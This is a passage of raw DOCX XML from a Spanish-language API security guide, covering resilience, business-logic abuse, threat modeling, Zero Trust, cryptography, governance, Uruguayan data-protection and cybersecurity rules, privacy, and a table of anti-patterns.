        <w:t>6.12 Disponibilidad y resiliencia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> la "A" de la tríada CIA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Resistencia a DoS/DDoS:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> límites, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>shaping</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, absorción en el borde.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Backpressure y circuit breakers:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> evitar fallos en cascada.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Degradación elegante:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> responder con lo esencial cuando una dependencia falla.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Continuidad:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> planes de recuperación, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>failover</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, pruebas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> endpoints costosos sin cuota, falta de timeouts, dependencias sin aislamiento.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP API4:2023; NIST SP 800-160 (ingeniería de sistemas resilientes).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.13 Lógica de negocio, fraude y abuso</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> que la API se use para lo que fue diseñada.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Abusos frecuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> scraping, escalping de stock, cupones repetidos, creación masiva de cuentas, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>referral fraud</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, abuso de reembolsos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Detección:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> límites por </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>flujo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (no solo por request), reglas de negocio, correlación entre identidades y patrones.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el ataque es una secuencia de llamadas válidas en orden indebido o en exceso.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba (lab):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> repetir un flujo legítimo más veces de las previstas y observar si el sistema lo frena.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP API6:2023 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Unrestricted Access to Sensitive Business Flows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6.14 Diseño seguro y threat modeling</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> resolver el riesgo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>antes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de codificar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Metodologías:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> STRIDE (amenazas), LINDDUN (privacidad), PASTA (riesgo), DREAD (priorización), árboles de ataque.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Insumos:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> diagramas de flujo de datos, límites de confianza, activos, actores.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Salida:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> amenazas priorizadas con controles y dueños.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> hacer threat modeling una vez y archivarlo; no involucrar a producto.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Microsoft STRIDE; OWASP Threat Modeling; NIST SP 800-154.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.15 Zero Trust aplicado a APIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> elimina la confianza implícita del perímetro.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Principios:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> verificar explícitamente, mínimo privilegio, asumir la brecha.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>En APIs:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cada request se evalúa por identidad y contexto; el tráfico interno también se autentica (mesh/mTLS); políticas por recurso, no por red.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>En identidad:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sesiones y tokens con vida corta, reevaluación continua, step-up.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> NIST SP 800-207 (Zero Trust Architecture).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.16 Criptografía y gestión de claves</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> la confianza técnica (firma, cifrado, identidad).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>JOSE:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> JWS (firma), JWE (cifrado), JWK (claves), JWA (algoritmos).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>PKI y mTLS:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> certificados, cadenas, revocación (CRL/OCSP), rotación.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Custodia de claves:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> KMS/HSM, separación de funciones, rotación, y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>preparación poscuántica</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (migración a algoritmos resistentes).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Errores a evitar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> algoritmos obsoletos, claves compartidas, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>alg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> desde el token (RFC 8725).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> RFC 7515–7518 (2015); RFC 8725 (2020); NIST PQC (2024).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.17 Gobierno, madurez y cultura</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> que la seguridad sea </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sostenible</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y no dependa de héroes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Propiedad:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cada API con dueño, con SLA y con canal de reporte.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Madurez:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP SAMM, modelos de madurez de seguridad de API, métricas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Centro de excelencia:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> estándares, plantillas, revisión de diseño, capacitación.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Diseño como código:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>policy as code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>infrastructure as code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, pruebas de seguridad en el pipeline.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP SAMM; NIST CSF 2.0 (2024).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.18 Cumplimiento y normativa (con Uruguay)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> que el sistema cumpla lo que la ley y el estándar exigen.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Estándares:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ISO/IEC 27001, PCI DSS, NIST, OWASP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Uruguay:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>AGESIC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> conduce la estrategia de gobierno digital y ciberseguridad.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ley 18.331 (2008)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de Protección de Datos Personales y su </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Unidad Reguladora (URCDP)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  - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Decreto 66/025</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de ciberseguridad: obligaciones para organismos y prestadores, incluida la </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>gestión de incidentes y el reporte a CERTuy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  - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CERTuy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (AGESIC): canal oficial de reporte de incidentes — https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>ID Uruguay</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: proveedor de identidad del Estado (OpenID Connect, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>token_type: Bearer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>), documentación técnica en gub.uy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Traducción a controles:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> inventario, gestión de accesos, rotación de secretos, registro de eventos, respuesta a incidentes, divulgación responsable.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.19 Privacidad y protección de datos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> a las personas cuyos datos tratan las APIs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Principios:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> minimización, finalidad, proporcionalidad, retención limitada, residencia, consentimiento.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Diseño:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> privacidad desde el diseño y por defecto (LINDDUN); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>pseudonimización</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; cifrado.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Derechos:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> acceso, rectificación, supresión.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>En APIs:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> no devolver PII de más, no loguearla, no exponerla en errores, y permitir el borrado efectivo (fin del mito "el token es anónimo").</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ley 18.331 (Uruguay); URCDP; LINDDUN.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.20 Catálogo de anti-patrones (checklist de lo que NO hacer)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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Anti-patrón</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Por qué duele</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Qué hacer en su lugar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Token en la URL/query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 xml:space="preserve">Queda en logs,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Referer</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>, historial, CDN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 xml:space="preserve">Cabecera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Authorization</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> (RFC 9700)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Secreto hardcodeado en el cliente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Cualquiera lo extrae del bundle/app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Backend-for-frontend; no confiar en el cliente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Autorización solo en el front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El front no es un control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Autorizar en el servidor, a nivel de objeto</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
